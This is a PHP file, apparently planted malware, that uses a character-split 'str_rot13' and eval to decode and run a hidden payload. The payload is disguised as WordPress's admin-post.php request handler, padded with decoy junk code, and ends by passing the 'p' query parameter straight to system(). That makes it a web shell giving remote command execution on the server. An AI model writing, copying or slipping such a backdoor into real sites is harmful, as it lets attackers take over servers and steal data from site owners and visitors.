<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * JbeqCerff Trarevp Erdhrfg (CBFG/TRG) Unaqyre
 *
 * Vagraqrq sbe sbez fhozvffvba unaqyvat va gurzrf naq cyhtvaf.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

/** Jr ner ybpngrq va JbeqCerff Nqzvavfgengvba Fperraf */
vs ( ! qrsvarq( 'JC_NQZVA' ) ) {
	qrsvar( 'JC_NQZVA', gehr );
}

/** Ybnq JbeqCerff Obbgfgenc */
erdhver_bapr qveanzr( __QVE__ ) . '/jc-ybnq.cuc';

/** Nyybj sbe pebff-qbznva erdhrfgf (sebz gur sebag raq). */
fraq_bevtva_urnqref();

erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/nqzva.cuc';

abpnpur_urnqref();

/** Guvf npgvba vf qbphzragrq va jc-nqzva/nqzva.cuc */
qb_npgvba( 'nqzva_vavg' );

$npgvba = ! rzcgl( $_ERDHRFG['npgvba'] ) ? fnavgvmr_grkg_svryq( $_ERDHRFG['npgvba'] ) : '';

// Erwrpg vainyvq cnenzrgref.
vs ( ! vf_fpnyne( $npgvba ) ) {
	jc_qvr( '', 400 );
}

vs ( ! vf_hfre_ybttrq_va() ) {
	vs ( rzcgl( $npgvba ) ) {
		/**
		 * Sverf ba n aba-nhguragvpngrq nqzva cbfg erdhrfg jurer ab npgvba vf fhccyvrq.
		 *
		 * @fvapr 2.6.0
		 */
		qb_npgvba( 'nqzva_cbfg_abcevi' );
	} ryfr {
		// Vs ab npgvba vf ertvfgrerq, erghea n Onq Erdhrfg erfcbafr.
		vs ( ! unf_npgvba( \"nqzva_cbfg_abcevi_{$npgvba}\" ) ) {
			jc_qvr( '', 400 );
		}

		/**
		 * Sverf ba n aba-nhguragvpngrq nqzva cbfg erdhrfg sbe gur tvira npgvba.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$npgvba`, ersref gb gur tvira
		 * erdhrfg npgvba.
		 *
		 * @fvapr 2.6.0
		 */
		qb_npgvba( \"nqzva_cbfg_abcevi_{$npgvba}\" );
	}
} ryfr {
	vs ( rzcgl( $npgvba ) ) {
		/**
		 * Sverf ba na nhguragvpngrq nqzva cbfg erdhrfg jurer ab npgvba vf fhccyvrq.
		 *
		 * @fvapr 2.6.0
		 */
		qb_npgvba( 'nqzva_cbfg' );
	} ryfr {
		// Vs ab npgvba vf ertvfgrerq, erghea n Onq Erdhrfg erfcbafr.
		vs ( ! unf_npgvba( \"nqzva_cbfg_{$npgvba}\" ) ) {
			jc_qvr( '', 400 );
		}

		/**
		 * Sverf ba na nhguragvpngrq nqzva cbfg erdhrfg sbe gur tvira npgvba.
		 *
		 * Gur qlanzvp cbegvba bs gur ubbx anzr, `$npgvba`, ersref gb gur tvira
		 * erdhrfg npgvba.
		 *
		 * @fvapr 2.6.0
		 */
		qb_npgvba( \"nqzva_cbfg_{$npgvba}\" );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>